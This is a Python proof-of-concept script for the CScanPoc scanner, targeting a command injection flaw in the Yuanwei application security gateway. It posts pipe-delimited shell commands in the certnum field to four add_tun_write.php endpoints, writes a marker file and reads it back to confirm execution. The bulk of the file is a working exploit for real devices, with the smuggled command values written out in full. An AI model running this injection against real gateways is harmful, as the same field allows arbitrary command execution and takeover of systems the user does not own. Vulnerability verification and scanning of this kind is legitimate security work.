# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import random

class Vuln(ABVuln):
    vuln_id = 'Yuanwei_0011' # 平台漏洞编号，留空
    name = '远为应用安全网关命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        远为应用安全网关多处命令执行。
        /ipsecconfig/tun/add_tun_write.php
        /ipsec.bak/tun/add_tun_write.php
        /ipsecconfig/usertun/add_tun_write.php
        /ipsec.bak/usertun/add_tun_write.php
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '远为应用安全网关'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ea0a166a-7a53-4712-8c3d-88a98192a2b7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            urls = [
                arg + '/ipsecconfig/tun/add_tun_write.php',
                arg + '/ipsec.bak/tun/add_tun_write.php',
                arg + '/ipsecconfig/usertun/add_tun_write.php',
                arg + '/ipsec.bak/usertun/add_tun_write.php'
            ]
            posts = [
                'certnum=w|echo%20testvul0>../test.txt|y',
                'certnum=w|echo%20testvul1>../../ipsecconfig/test.txt|y',
                'certnum=w|echo%20testvul2>../test.txt|y',
                'certnum=w|echo%20testvul3>../../ipsecconfig/test.txt|y'
            ]
            verify_url = arg + '/ipsecconfig/test.txt'
            for i in range(len(urls)):
                url = urls[i]
                post = posts[i]
                code, head, res, err, _ = hh.http(url, post, header=content_type)
                if (code != 200) and (code != 302):
                    continue
                #验证
                code, head, res, err, _ = hh.http(verify_url)
                #print res
                if (code == 200) and ('testvul'+str(i) in res):
                    #security_hole('Command execution: ' + url + ' POST:' + post)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
